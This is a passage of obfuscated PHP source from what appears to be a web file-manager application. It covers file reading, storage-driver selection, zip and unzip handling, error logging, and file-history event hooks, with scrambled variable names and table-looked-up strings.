$‡«ãåÒö = $¤ìŒİÒİ; if ($÷ğşŠÇØ < 0) { $÷ğşŠÇØ = $øˆ´íçş + $÷ğşŠÇØ; } if ($¤ìŒİÒİ === !1) { $¤ìŒİÒİ = $øˆ´íçş - $÷ğşŠÇØ; } if ($÷ğşŠÇØ + $¤ìŒİÒİ > $øˆ´íçş) { $¤ìŒİÒİ = $øˆ´íçş - $÷ğşŠÇØ; } if (!$øˆ´íçş && $—›Íú…î->getType() == $ìÑŒî‰[109] && !$—›Íú…î->exist($ÍÇ¯ş€ë)) { $•ºòüÉø = get_path_this($ÍÇ¯ş€ë); $ˆçöÉì£ = parse_url_query($•ºòüÉø); if (is_array($ˆçöÉì£) && isset($ˆçöÉì£[$ìÑŒî‰[32]])) { $•ºòüÉø = urldecode($ˆçöÉì£[$ìÑŒî‰[32]]); } throw new Exception($ìÑŒî‰[1256] . LNG($ìÑŒî‰[1257]) . $ìÑŒî‰[1054] . clear_html($•ºòüÉø) . $ìÑŒî‰[12]); } if ($¤ìŒİÒİ <= 0) { return $ìÑŒî‰[12]; } if ($÷ğşŠÇØ < 0 || $÷ğşŠÇØ >= $øˆ´íçş || $¤ìŒİÒİ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\145\122\145\x61\x64\40\x65\x72\x72\x6f\x72\x21\40\163\164\141\162\x74\75{$÷ğşŠÇØ}\73\154\145\156\x67\x74\150\75{$¤ìŒİÒİ}\73\x20\x73\x69\172\145\75{$øˆ´íçş}\73"); } $‡Öë‰Ã = $—›Íú…î->fileSubstr($ÍÇ¯ş€ë, $÷ğşŠÇØ, $¤ìŒİÒİ); if (!$‡Öë‰Ã && $¤ìŒİÒİ && isset($GLOBALS[$ìÑŒî‰[1258]])) { throw new Exception($GLOBALS[$ìÑŒî‰[1258]][$ìÑŒî‰[1259]]); } return $‡Öë‰Ã; } private static function driverMake(&$ ªãÆø) { $«ßç“Š =& $_SERVER[†ûãı«°]; $Ì˜åõ÷‘ = KodIO::parse($ ªãÆø); if (!self::$driverListSystem) { $²ÄÏŒ” = Model($«ßç“Š[843])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($²ÄÏŒ”, $«ßç“Š[477]); } if ($Ì˜åõ÷‘[$«ßç“Š[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ì˜åõ÷‘[$«ßç“Š[477]]]) { throw new Exception($«ßç“Š[1260]); return !1; } $ ªãÆø = $Ì˜åõ÷‘[$«ßç“Š[1261]]; $¹Úˆ”’ = self::driverGet($Ì˜åõ÷‘, $ ªãÆø); return $¹Úˆ”’; } private static function driverGet($ì±ÂâĞÕ, &$µ±Ö‚ü‚) { $ªñèÄà =& $_SERVER[†ûãı«°]; $ºˆ«»Š» = $ì±ÂâĞÕ[$ªñèÄà[1262]]; $’†à¤®ü = $ì±ÂâĞÕ[$ªñèÄà[477]]; switch ($ì±ÂâĞÕ[$ªñèÄà[33]]) { case KodIO::KOD_IO: $ã¹„İÓ = self::$driverListSystem[$’†à¤®ü]; break; case KodIO::KOD_SOURCE: $µ±Ö‚ü‚ = $’†à¤®ü . $µ±Ö‚ü‚; $ã¹„İÓ = array($ªñèÄà[1263] => $ªñèÄà[1264], $ªñèÄà[6] => $ì±ÂâĞÕ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ù¼ªæ£î = $GLOBALS[$ªñèÄà[1265]]; self::$driverListUser = array_to_keyvalue($ù¼ªæ£î, $ªñèÄà[477]); } $ã¹„İÓ = self::$driverListUser[$’†à¤®ü]; break; case KodIO::KOD_SHARE_LINK: $ã¹„İÓ = array($ªñèÄà[1263] => $ªñèÄà[1266], $ªñèÄà[6] => $ì±ÂâĞÕ); $ùÚİ”÷š = Action($ªñèÄà[1267])->sharePathInfo($ì±ÂâĞÕ[$ªñèÄà[87]]); $µ±Ö‚ü‚ = $ùÚİ”÷š[$ªñèÄà[193]]; if (!$ùÚİ”÷š[$ªñèÄà[193]]) { $À½ö½î† = Model($ªñèÄà[671])->getInfo($ùÚİ”÷š[$ªñèÄà[672]]); $µ±Ö‚ü‚ = KodIO::clear($À½ö½î†[$ªñèÄà[1268]] . $ì±ÂâĞÕ[$ªñèÄà[1261]]); $ì±ÂâĞÕ[$ªñèÄà[564]] = $À½ö½î†; $ì±ÂâĞÕ[$ªñèÄà[1243]] = $µ±Ö‚ü‚; $ã¹„İÓ = array($ªñèÄà[1263] => $ªñèÄà[1269], $ªñèÄà[6] => $ì±ÂâĞÕ); } break; case KodIO::KOD_SHARE_ITEM: $ã¹„İÓ = array($ªñèÄà[1263] => $ªñèÄà[1270], $ªñèÄà[6] => $ì±ÂâĞÕ); $À½ö½î† = Model($ªñèÄà[671])->getInfo($ì±ÂâĞÕ[$ªñèÄà[477]]); if ($À½ö½î†[$ªñèÄà[193]] == $ªñèÄà[230]) { $µ±Ö‚ü‚ = KodIO::clear($À½ö½î†[$ªñèÄà[1268]] . $ì±ÂâĞÕ[$ªñèÄà[1261]]); $ì±ÂâĞÕ[$ªñèÄà[564]] = $À½ö½î†; $ì±ÂâĞÕ[$ªñèÄà[1243]] = $µ±Ö‚ü‚; $ã¹„İÓ = array($ªñèÄà[1263] => $ªñèÄà[1271], $ªñèÄà[6] => $ì±ÂâĞÕ); } else { if (!$µ±Ö‚ü‚) { $µ±Ö‚ü‚ = $À½ö½î†[$ªñèÄà[193]]; } } break; default: $µ±Ö‚ü‚ = $ì±ÂâĞÕ[$ªñèÄà[87]]; $ã¹„İÓ = array($ªñèÄà[1263] => $ªñèÄà[1272]); break; } $²¿ËàËÔ = $ì±ÂâĞÕ[$ªñèÄà[87]]; if (!isset(self::$driverCache[$²¿ËàËÔ])) { $ÆÅÛüŒ‰ = strtolower($ã¹„İÓ[$ªñèÄà[98]]); $Ú¿Ú½ô = $GLOBALS[$ªñèÄà[6]][$ªñèÄà[92]][$ªñèÄà[907]]; $Ğ®µòèÁ = $ªñèÄà[77] . (isset($Ú¿Ú½ô[$ÆÅÛüŒ‰]) ? $Ú¿Ú½ô[$ÆÅÛüŒ‰] : ucfirst($ÆÅÛüŒ‰)); if (!class_exists($Ğ®µòèÁ)) { show_json("{$Ğ®µòèÁ}\x20\x6e\157\x74\x20\x65\170\x69\163\164\x73\41", !1); } $á¼»¾İ = isset($ã¹„İÓ[$ªñèÄà[6]]) ? $ã¹„İÓ[$ªñèÄà[6]] : !1; self::$driverCache[$²¿ËàËÔ] = new $Ğ®µòèÁ($á¼»¾İ); } $¼µš¡… = self::$driverCache[$²¿ËàËÔ]; $¼µš¡…->pathDriver = $ºˆ«»Š»; $¼µš¡…->pathBase = $ªñèÄà[12]; if (isset($ã¹„İÓ[$ªñèÄà[6]][$ªñèÄà[1273]])) { $¼µš¡…->pathBase = rtrim($ã¹„İÓ[$ªñèÄà[6]][$ªñèÄà[1273]], $ªñèÄà[8]) . $ªñèÄà[8]; $µ±Ö‚ü‚ = $¼µš¡…->pathBase . ltrim($µ±Ö‚ü‚, $ªñèÄà[8]); } $µ±Ö‚ü‚ = $¼µš¡…->getPath($µ±Ö‚ü‚); if (isset($ì±ÂâĞÕ[$ªñèÄà[1243]])) { $µ±Ö‚ü‚ = $ì±ÂâĞÕ[$ªñèÄà[1243]]; } $¼µš¡…->path = $µ±Ö‚ü‚; return $¼µš¡…; } public static function errorTips($âºßéüÅ = false) { $ö¼€’¼· =& $_SERVER[†ûãı«°]; static $ºÍ½‚‚Á = array(); $ÒÄÉ = 1000; if ($âºßéüÅ === -1) { return $ºÍ½‚‚Á ? $ºÍ½‚‚Á[count($ºÍ½‚‚Á) - 1] : $ö¼€’¼·[12]; } if ($âºßéüÅ === !1) { return implode($ö¼€’¼·[287], $ºÍ½‚‚Á); } if (count($ºÍ½‚‚Á) >= $ÒÄÉ) { $ºÍ½‚‚Á = array_slice($ºÍ½‚‚Á, $ÒÄÉ * 0.5, $ÒÄÉ); } $ºÍ½‚‚Á[] = $âºßéüÅ; write_log($ö¼€’¼·[176] . ACTION . $ö¼€’¼·[1274] . $âºßéüÅ, $ö¼€’¼·[1275]); } public static function getLastError($ÕÀúö©½ = '') { $åÑøµîş = self::errorTips(-1); return $åÑøµîş ? $åÑøµîş : $ÕÀúö©½; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Ö¼óñºÓ; if ($Ö¼óñºÓ) { return $Ö¼óñºÓ; } $ê¨ª©Ê• = IO::init($_SERVER[†ûãı«°][8]); return $ê¨ª©Ê•; } private static function iconvSystem($“ÅÉ—Ô×) { return self::local()->iconvSystem($“ÅÉ—Ô×); } private static function iconvApp($œ™–…úÀ) { return self::local()->iconvApp($œ™–…úÀ); } public static function zipFolder($ÖÖıé…ˆ, $•ô±êæ¶ = "\x7a\x69\160", $’¥ÈŠ×— = '', $­Ë‰˜ó = REPEAT_RENAME) { $Ãàõ›’ô =& $_SERVER[†ûãı«°]; $í¶ä½ = IO::listPath($ÖÖıé…ˆ); if (!$í¶ä½) { return !1; } $í¶ä½ = array_merge($í¶ä½[$Ãàõ›’ô[85]], $í¶ä½[$Ãàõ›’ô[86]]); return self::zip($í¶ä½, $•ô±êæ¶, $’¥ÈŠ×—, $­Ë‰˜ó); } public static function zip($¡œ¹õçÜ, $€ÇŠø‚ = "\172\x69\160", $À°ÛãÌ› = '', $¸ÊÕ‡œ­ = REPEAT_RENAME) { $®à˜ÛŞ½ =& $_SERVER[†ûãı«°]; if (is_string($¡œ¹õçÜ) && $¡œ¹õçÜ) { $¡œ¹õçÜ = array(array($®à˜ÛŞ½[87] => $¡œ¹õçÜ)); } $Üáê€° = self::init($¡œ¹õçÜ[0][$®à˜ÛŞ½[87]]); $ªè®¨ë¤ = self::info($¡œ¹õçÜ[0][$®à˜ÛŞ½[87]]); $Âó¼£ğà = $®à˜ÛŞ½[12]; $à€µ¢ñ… = $®à˜ÛŞ½[12]; $ˆ«‘éÈÌ = $®à˜ÛŞ½[12]; if ($À°ÛãÌ› && substr($À°ÛãÌ›, -1, 1) != $®à˜ÛŞ½[8]) { $à€µ¢ñ… = get_path_father($À°ÛãÌ›); $ˆ«‘éÈÌ = get_path_this($À°ÛãÌ›); } else { $à€µ¢ñ… = self::pathFather($ªè®¨ë¤[$®à˜ÛŞ½[87]]); $ˆ«‘éÈÌ = $ªè®¨ë¤[$®à˜ÛŞ½[32]] . $®à˜ÛŞ½[10] . $€ÇŠø‚; if (count($¡œ¹õçÜ) > 1) { $«–úáúŞ = IO::info($à€µ¢ñ…); $ˆ«‘éÈÌ = $«–úáúŞ[$®à˜ÛŞ½[32]] . $®à˜ÛŞ½[10] . $€ÇŠø‚; } if ($À°ÛãÌ›) { $à€µ¢ñ… = $À°ÛãÌ›; } } if ($Üáê€°->getType() == $®à˜ÛŞ½[109]) { $ï’’­…â = self::init($à€µ¢ñ…); $ç’¾¯‚ = $ï’’­…â->getType() == $®à˜ÛŞ½[109] ? $à€µ¢ñ… : get_path_father($Üáê€°->path); $ç’¾¯‚ = IO::getPathInner($ç’¾¯‚); $ç’¾¯‚ = rtrim($ç’¾¯‚, $®à˜ÛŞ½[8]) . $®à˜ÛŞ½[8]; mk_dir($ç’¾¯‚); } else { $Âó¼£ğà = TEMP_FILES . $®à˜ÛŞ½[1276] . time() . rand_string(8) . $®à˜ÛŞ½[8]; mk_dir($Âó¼£ğà); file_put_contents($Âó¼£ğà . $®à˜ÛŞ½[1277], $®à˜ÛŞ½[12]); $ç’¾¯‚ = $Âó¼£ğà; } $äïúïù¶ = IO::info($ç’¾¯‚); if (!$äïúïù¶ || !$äïúïù¶[$®à˜ÛŞ½[235]]) { show_json(LNG($®à˜ÛŞ½[1278]), !1); } $ëÖ›ú—Í = self::zipFileList($¡œ¹õçÜ, $Âó¼£ğà); foreach ($ëÖ›ú—Í as $íŞèÉö® => $íÌÑÁ¦) { $ëÖ›ú—Í[$íŞèÉö®] = self::iconvSystem($íÌÑÁ¦); } $Ï¬ı¾ôı = get_filename_auto($ç’¾¯‚ . $ˆ«‘éÈÌ, $®à˜ÛŞ½[12], $¸ÊÕ‡œ­); KodArchive::create(self::iconvSystem($Ï¬ı¾ôı), $ëÖ›ú—Í); if (!IO::exist($Ï¬ı¾ôı)) { if ($Âó¼£ğà) { del_dir($Âó¼£ğà); } write_log($®à˜ÛŞ½[1279] . $Ï¬ı¾ôı, $®à˜ÛŞ½[390]); show_json(LNG($®à˜ÛŞ½[1280]), !1); } if (!$Âó¼£ğà) { return $Ï¬ı¾ôı; } $İ‰¹óÀè = self::move($Ï¬ı¾ôı, $à€µ¢ñ…, $¸ÊÕ‡œ­); if ($Âó¼£ğà) { del_dir($Âó¼£ğà); } if (!$Ï¬ı¾ôı) { write_log($®à˜ÛŞ½[1281] . $Ï¬ı¾ôı . $®à˜ÛŞ½[1282] . $à€µ¢ñ…, $®à˜ÛŞ½[390]); show_json(LNG($®à˜ÛŞ½[1280]), !1); } return $İ‰¹óÀè; } public static function unzip($Öñ© Èç, $ÜÊâóµÛ, $Ö”ÍŸ«Ê = "\x2d\x31", $şˆÅ÷×ò = "\x72\x65\x70\x6c\x61\143\145") { $¬Ù¯Ëƒ” =& $_SERVER[†ûãı«°]; $çãùÚ€¥ = parent::info($Öñ© Èç); if (!$çãùÚ€¥) { show_json(LNG($¬Ù¯Ëƒ”[1283]), !1); } $¬’±àö = IO::infoFullSimple($ÜÊâóµÛ); if (!$¬’±àö) { $ÜÊâóµÛ = IO::mkdir($ÜÊâóµÛ); } if (isset($¬’±àö[$¬Ù¯Ëƒ”[193]]) && trim($¬’±àö[$¬Ù¯Ëƒ”[87]], $¬Ù¯Ëƒ”[8]) != trim($ÜÊâóµÛ, $¬Ù¯Ëƒ”[8])) { $‰°ü±å = KodIO::make($¬’±àö[$¬Ù¯Ëƒ”[192]]); $Üà­…Ó = IO::fileNameAuto($‰°ü±å, $¬’±àö[$¬Ù¯Ëƒ”[32]], REPEAT_RENAME_FOLDER, !0); $ÜÊâóµÛ = IO::mkdir($‰°ü±å . $Üà­…Ó); } $Ö”ÍŸ«Ê = $Ö”ÍŸ«Ê && $Ö”ÍŸ«Ê != $¬Ù¯Ëƒ”[1284] ? @json_decode($Ö”ÍŸ«Ê, !0) : -1; $ùÃğ“É = self::unzipPart($Öñ© Èç, $Ö”ÍŸ«Ê); if (!$ùÃğ“É || !IO::exist($ùÃğ“É[$¬Ù¯Ëƒ”[232]])) { show_json(LNG($¬Ù¯Ëƒ”[108]), !1); } $‘›ÇÌÙœ = $ùÃğ“É[$¬Ù¯Ëƒ”[1285]][count($ùÃğ“É[$¬Ù¯Ëƒ”[1285]]) - 1]; if ($‘›ÇÌÙœ[$¬Ù¯Ëƒ”[1286]] == -1 || substr($‘›ÇÌÙœ[$¬Ù¯Ëƒ”[32]], -1, 1) == $¬Ù¯Ëƒ”[8]) { $ùÖş›¿ = $ùÃğ“É[$¬Ù¯Ëƒ”[1287]] . rand_string(10) . $¬Ù¯Ëƒ”[8]; mk_dir($ùÖş›¿); $¥ö«åùï = count($ùÃğ“É[$¬Ù¯Ëƒ”[1285]]) == 1 ? IO::ext($Öñ© Èç) : get_path_ext($ùÃğ“É[$¬Ù¯Ëƒ”[232]]); $İÛ¶å°¨ = KodArchive::extract(self::iconvSystem($ùÃğ“É[$¬Ù¯Ëƒ”[232]]), $ùÖş›¿, $‘›ÇÌÙœ[$¬Ù¯Ëƒ”[1286]], $Üà­…Ó, $¥ö«åùï); self::unzipErrorCheck($İÛ¶å°¨, array($¬Ù¯Ëƒ”[1288], $Öñ© Èç, $¥ö«åùï, $ÜÊâóµÛ, $ùÃğ“É)); Hook::trigger($¬Ù¯Ëƒ”[1289], $ùÖş›¿); recursion_dir($ùÖş›¿, $˜ğò„¡, $êé™õÌ, 0); $¤å¾¼˜ò = array_merge($˜ğò„¡, $êé™õÌ); $¸ÍĞ¼Îë = array(); foreach ($¤å¾¼˜ò as $¥Ö÷›Ä) { $‘€ùÛ£¡ = IO::move(self::iconvApp($¥Ö÷›Ä), $ÜÊâóµÛ, $şˆÅ÷×ò); if ($‘€ùÛ£¡) { $¸ÍĞ¼Îë[] = $‘€ùÛ£¡; } } del_dir($ùÖş›¿); } else { $‘€ùÛ£¡ = IO::move($ùÃğ“É[$¬Ù¯Ëƒ”[232]], $ÜÊâóµÛ, $şˆÅ÷×ò, get_path_this($‘›ÇÌÙœ[$¬Ù¯Ëƒ”[32]])); if ($‘€ùÛ£¡) { $¸ÍĞ¼Îë[] = $‘€ùÛ£¡; } } return $¸ÍĞ¼Îë ? $¸ÍĞ¼Îë : !1; } public static function unzipList($¢Î¢ƒ´œ) { $¿Ôä› =& $_SERVER[†ûãı«°]; $¼ÅÍï¤Æ = isset($¢Î¢ƒ´œ[$¿Ôä›[1290]]) ? $¢Î¢ƒ´œ[$¿Ôä›[1290]] : !1; $ÕÄöÜ³ñ = isset($¢Î¢ƒ´œ[$¿Ôä›[1286]]) ? @json_decode($¢Î¢ƒ´œ[$¿Ôä›[1286]], !0) : -1; $î‚ÙÉ† = self::unzipPart($¢Î¢ƒ´œ[$¿Ôä›[87]], $ÕÄöÜ³ñ); if (!$î‚ÙÉ† || !IO::exist($î‚ÙÉ†[$¿Ôä›[232]])) { show_json(LNG($¿Ôä›[108]), !1); } $¤ïŠ˜Äó = $î‚ÙÉ†[$¿Ôä›[1285]][count($î‚ÙÉ†[$¿Ôä›[1285]]) - 1]; $œ‰¨ÍÅÃ = in_array(IO::ext($î‚ÙÉ†[$¿Ôä›[232]]), array($¿Ôä›[390], $¿Ôä›[1291], $¿Ôä›[1292], $¿Ôä›[1293], $¿Ôä›[1294], $¿Ôä›[1295])); if (!$¼ÅÍï¤Æ && ($¤ïŠ˜Äó[$¿Ôä›[1286]] == -1 || $œ‰¨ÍÅÃ)) { $–Õ–¿¯“ = $î‚ÙÉ†[$¿Ôä›[1287]] . get_path_this($î‚ÙÉ†[$¿Ôä›[232]]) . $¿Ôä›[1296]; if (!IO::exist($–Õ–¿¯“)) { $û¥ûÁÑ§ = $¤ïŠ˜Äó[$¿Ôä›[1286]] == -1 ? get_path_ext(IO::pathThis($¢Î¢ƒ´œ[$¿Ôä›[87]])) : get_path_ext($î‚ÙÉ†[$¿Ôä›[232]]); $Ÿ˜Ò„¸Ë = KodArchive::listContent(self::iconvSystem($î‚ÙÉ†[$¿Ôä›[232]]), !0, $û¥ûÁÑ§); self::unzipErrorCheck($Ÿ˜Ò„¸Ë, array($¿Ôä›[1297], $¢Î¢ƒ´œ, $î‚ÙÉ†)); @file_put_contents($–Õ–¿¯“, json_encode($Ÿ˜Ò„¸Ë[$¿Ôä›[1298]])); } return @json_decode(IO::getContent($–Õ–¿¯“), !0); } IO::fileOut($î‚ÙÉ†[$¿Ôä›[232]], $¼ÅÍï¤Æ, get_path_this($¤ïŠ˜Äó[$¿Ôä›[32]])); die; } private static function zipFileList($ŠÅé˜¨ı, $û½…ğ©ª = false) { $àø‡×¸ =& $_SERVER[†ûãı«°]; $À£åÏ½± = array(); foreach ($ŠÅé˜¨ı as $’ÇÀş÷š) { $ÄÊØóè = $’ÇÀş÷š[$àø‡×¸[87]]; if ($û½…ğ©ª) { $ÄÊØóè = self::copy($’ÇÀş÷š[$àø‡×¸[87]], $û½…ğ©ª, $àø‡×¸[900]); } else { $Î¦•²Ë‘ = self::init($’ÇÀş÷š[$àø‡×¸[87]]); if ($Î¦•²Ë‘->getType() == $àø‡×¸[109]) { $ÄÊØóè = $Î¦•²Ë‘->path; } } if ($ÄÊØóè && self::local()->exist($ÄÊØóè)) { $À£åÏ½±[$’ÇÀş÷š[$àø‡×¸[87]]] = $ÄÊØóè; } } if (!empty($À£åÏ½±)) { return array_values($À£åÏ½±); } show_json(LNG($àø‡×¸[1257]), !1); } private static function localFilePath($©¡æØÕÉ) { $…¤·»Ê± =& $_SERVER[†ûãı«°]; $ªÖÆÙİ• = KodIO::parse($©¡æØÕÉ); if ($ªÖÆÙİ•[$…¤·»Ê±[33]] == KodIO::KOD_SOURCE) { $ÔÊí…à× = Model($…¤·»Ê±[906])->fileInfoGet(KodIO::sourceID($©¡æØÕÉ)); if (!$ÔÊí…à×[$…¤·»Ê±[87]]) { show_json($…¤·»Ê±[1299], !1); } $©¡æØÕÉ = $ÔÊí…à×[$…¤·»Ê±[87]]; } $ü¸œ’¸ = self::init($©¡æØÕÉ); if ($ü¸œ’¸->pathParse[$…¤·»Ê±[1243]]) { $©¡æØÕÉ = $ü¸œ’¸->pathParse[$…¤·»Ê±[1243]]; $ü¸œ’¸ = self::init($©¡æØÕÉ); } $ûÒÙ¾ç = $ü¸œ’¸->getType(); if ($ûÒÙ¾ç == $…¤·»Ê±[109] || $ûÒÙ¾ç == $…¤·»Ê±[1300]) { if (!$ü¸œ’¸->exist($ü¸œ’¸->path)) { show_json(LNG($…¤·»Ê±[108]), !1); } return $ü¸œ’¸->path; } return !1; } public static function unzipPart($¸Ğ—®ã, $ Á´ƒ½ş = -1) { $èº§àò =& $_SERVER[†ûãı«°]; $ÒÒçã×« = IO::pathThis($¸Ğ—®ã); if (!$ Á´ƒ½ş || $ Á´ƒ½ş == -1) { $Š›õ²ƒÚ = array(array($èº§àò[32] => $ÒÒçã×«, $èº§àò[1286] => -1)); $Š›õ²ƒÚ[0][$èº§àò[1301]] = $Š›õ²ƒÚ[0][$èº§àò[32]]; } else { if (is_array($ Á´ƒ½ş)) { $Š›õ²ƒÚ = $ Á´ƒ½ş; $İ¦ªÏ§¼ = count($Š›õ²ƒÚ) - 1; for ($‡Ããúğ· = 0; $‡Ããúğ· <= $İ¦ªÏ§¼; $‡Ããúğ·++) { $ˆ ‡à… = $Š›õ²ƒÚ[$‡Ããúğ·]; $à‰Î´ıˆ = get_path_this($ˆ ‡à…[$èº§àò[32]]) . (checkExtSafe($ˆ ‡à…[$èº§àò[32]]) ? $èº§àò[12] : $èº§àò[1302]); $Š›õ²ƒÚ[$‡Ããúğ·][$èº§àò[1301]] = $èº§àò[1303] . intval($ˆ ‡à…[$èº§àò[1286]]) . $èº§àò[464] . $à‰Î´ıˆ; if ($‡Ããúğ· == 0) { continue; } $Š›õ²ƒÚ[$‡Ããúğ·][$èº§àò[1301]] = $Š›õ²ƒÚ[$‡Ããúğ· - 1][$èº§àò[1301]] . $èº§àò[1304] . $Š›õ²ƒÚ[$‡Ããúğ·][$èº§àò[1301]]; } } } if (!is_array($Š›õ²ƒÚ) || count($Š›õ²ƒÚ) == 0) { return !1; } $¨¬¹»¤î = $Š›õ²ƒÚ[count($Š›õ²ƒÚ) - 1]; if (!IO::exist($¸Ğ—®ã)) { return !1; } $Ñí³ˆ¯á = TEMP_FILES . $èº§àò[1305] . kodIO::hashPathSafe($¸Ğ—®ã) . $èº§àò[8]; $±ø™Ùµ  = $Ñí³ˆ¯á . $¨¬¹»¤î[$èº§àò[1301]]; mk_dir($Ñí³ˆ¯á); file_put_contents(TEMP_FILES . $èº§àò[1277], $èº§àò[12]); if (IO::exist($±ø™Ùµ )) { return array($èº§àò[232] => $±ø™Ùµ , $èº§àò[1285] => $Š›õ²ƒÚ, $èº§àò[1287] => $Ñí³ˆ¯á); } $¨–Ø¾æĞ = self::localFilePath($¸Ğ—®ã); if (!$¨–Ø¾æĞ) { $¨–Ø¾æĞ = $Ñí³ˆ¯á . $èº§àò[1306]; if (!IO::exist($¨–Ø¾æĞ)) { self::copy($¸Ğ—®ã, $Ñí³ˆ¯á, !1, get_path_this($¨–Ø¾æĞ)); } } if (!$¨–Ø¾æĞ || !IO::exist($¨–Ø¾æĞ)) { return !1; } if ($¨¬¹»¤î[$èº§àò[1286]] == -1) { return array($èº§àò[232] => $¨–Ø¾æĞ, $èº§àò[1285] => $Š›õ²ƒÚ, $èº§àò[1287] => $Ñí³ˆ¯á); } $ºÂ§íÏ¸ = $¨–Ø¾æĞ; foreach ($Š›õ²ƒÚ as $‡Ããúğ· => $ˆ ‡à…) { if (!$ˆ ‡à… || $ˆ ‡à…[$èº§àò[1286]] == $èº§àò[1284]) { break; } if (substr($ˆ ‡à…[$èº§àò[32]], -1, 1) == $èº§àò[8]) { break; } $¿‡£‰ÆÆ = in_array(get_path_ext($ˆ ‡à…[$èº§àò[1301]]), array($èº§àò[390], $èº§àò[1291], $èº§àò[1292], $èº§àò[1293], $èº§àò[1294], $èº§àò[1295])); $à•ìøÂ¶ = $‡Ããúğ· == count($Š›õ²ƒÚ) - 1 && $¿‡£‰ÆÆ; $ÉõüÛƒ« = $Ñí³ˆ¯á . $ˆ ‡à…[$èº§àò[1301]]; $‘œœÃŸ = $Ñí³ˆ¯á . get_path_this($ˆ ‡à…[$èº§àò[32]]); if (IO::exist($ÉõüÛƒ«)) { $ºÂ§íÏ¸ = $ÉõüÛƒ«; continue; } $£Ñ¤õ«ª = $‡Ããúğ· == 0 ? get_path_ext($ÒÒçã×«) : get_path_ext($ºÂ§íÏ¸); $ ½û¶áÊ = KodArchive::extract(self::iconvSystem($ºÂ§íÏ¸), $Ñí³ˆ¯á, $ˆ ‡à…[$èº§àò[1286]], $ü¶Âş»ğ, $£Ñ¤õ«ª); self::unzipErrorCheck($ ½û¶áÊ, array($èº§àò[1307], $¸Ğ—®ã, $Š›õ²ƒÚ, $ˆ ‡à…, $ÉõüÛƒ«)); if (IO::exist($‘œœÃŸ)) { IO::rename($‘œœÃŸ, get_path_this($ÉõüÛƒ«)); } $ºÂ§íÏ¸ = $ÉõüÛƒ«; } $±ø™Ùµ  = $ºÂ§íÏ¸; return array($èº§àò[232] => $ºÂ§íÏ¸, $èº§àò[1285] => $Š›õ²ƒÚ, $èº§àò[1287] => $Ñí³ˆ¯á); } private static function unzipErrorCheck($éêÃ’İì, $²²„Ş¤´ = false) { $¾ÂËÙœÀ =& $_SERVER[†ûãı«°]; if ($éêÃ’İì[$¾ÂËÙœÀ[1308]]) { return !0; } write_log(array($¾ÂËÙœÀ[1309], $éêÃ’İì, $²²„Ş¤´), $¾ÂËÙœÀ[1310]); $Ÿ½ƒ¨–æ = is_array($éêÃ’İì[$¾ÂËÙœÀ[1298]]) ? json_encode($éêÃ’İì[$¾ÂËÙœÀ[1298]]) : $éêÃ’İì[$¾ÂËÙœÀ[1298]]; show_json($¾ÂËÙœÀ[1311] . $Ÿ½ƒ¨–æ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $±ŸÏŸ¤É =& $_SERVER[†ûãı«°]; $“¸ğ‘¯¸ = $GLOBALS[$±ŸÏŸ¤É[6]][$±ŸÏŸ¤É[92]]; if ($“¸ğ‘¯¸[$±ŸÏŸ¤É[1312]] != 1) { return; } if ($“¸ğ‘¯¸[$±ŸÏŸ¤É[1313]] <= 0) { return; } if (isset($_REQUEST[$±ŸÏŸ¤É[1314]]) && $_REQUEST[$±ŸÏŸ¤É[1314]] == $±ŸÏŸ¤É[91]) { return; } Hook::bind($±ŸÏŸ¤É[1315], $±ŸÏŸ¤É[1316]); Hook::bind($±ŸÏŸ¤É[1317], $±ŸÏŸ¤É[1318]); Hook::bind($±ŸÏŸ¤É[1319], $±ŸÏŸ¤É[1320]); Hook::bind($±ŸÏŸ¤É[1321], $±ŸÏŸ¤É[1322]); Hook::bind($±ŸÏŸ¤É[1323], $±ŸÏŸ¤É[1324]); Hook::bind($±ŸÏŸ¤É[1325], $±ŸÏŸ¤É[1326]); } public static function eventBeforeUpload($Ê¡îèØä) { if ($Ê¡îèØä[3] && $Ê¡îèØä[3] != REPEAT_REPLACE) { return; } $°¾»›Ø÷ = self::parsePath($Ê¡îèØä[0]); if (!$°¾»›Ø÷) { return; } self::add($°¾»›Ø÷); } public static function eventBeforeEdit($‰­ò­Æ¯) { $ñÚ½Ìµã = self::parsePath($‰­ò­Æ¯[0]); if (!$ñÚ½Ìµã) { return; } self::add($ñÚ½Ìµã); } public static function eventBeforeCopyFile($ïÎ¥óŒ„, $„ë»‘‹Æ, $·èÌ³¤Ù, $¸Ëúì¯·, $üÊÎÆÅ©, $æÒ·¥³É) { $á¹”ø²‘ =& $_SERVER[†ûãı«°]; if (isset($·èÌ³¤Ù->_data[$á¹”ø²‘[1247]]) && $·èÌ³¤Ù->_data[$á¹”ø²‘[1247]]) { return; } $³¹Æ§ = $·èÌ³¤Ù->getPathOuter($¸Ëúì¯·); $ÏÌ‡Ìˆ¡ = self::parsePath($³¹Æ§); if (!$ÏÌ‡Ìˆ¡) { return; } self::add($ÏÌ‡Ìˆ¡); } public static function eventBeforeRename($îÕÙüçº) { $…æ¾³ù =& $_SERVER[†ûãı«°]; $†«äœ™ = self::parsePath($îÕÙüçº[0]); if (!$†«äœ™) { return; } $ºÅï† ˜ = self::checkInHistory($†«äœ™); if (!$ºÅï† ˜) { return; } if ($ºÅï† ˜[$…æ¾³ù[33]] == $…æ¾³ù[232]) { $´Ø™®ü® = self::listData($†«äœ™); if ($´Ø™®ü® && $´Ø™®ü®[$…æ¾³ù[447]]) { self::moveHistory($†«äœ™, $îÕÙüçº[1]); } } else { IO::rename($ºÅï† ˜[$…æ¾³ù[87]], $îÕÙüçº[1]); } } public static function eventBeforeMove($«÷¤ÆŒ¦) { $êÂ£²÷ñ =& $_SERVER[†ûãı«°]; $Ä¢ÛÅ¸å = self::parsePath($«÷¤ÆŒ¦[0]); if (!$Ä¢ÛÅ¸å) { return; } $‚¸Öáúú = self::parsePath($«÷¤ÆŒ¦[1]); if (!$‚¸Öáúú) { return; } $ˆĞƒ‡ÔĞ = $«÷¤ÆŒ¦[3]; $âçŒœìØ = self::checkInHistory($Ä¢ÛÅ¸å); if (!$âçŒœìØ) { return; } $ÏŠ˜ì“ø = self::pathHistory($‚¸Öáúú); if ($âçŒœìØ[$êÂ£²÷ñ[33]] == $êÂ£²÷ñ[232]) { $Òóıó¯ø = 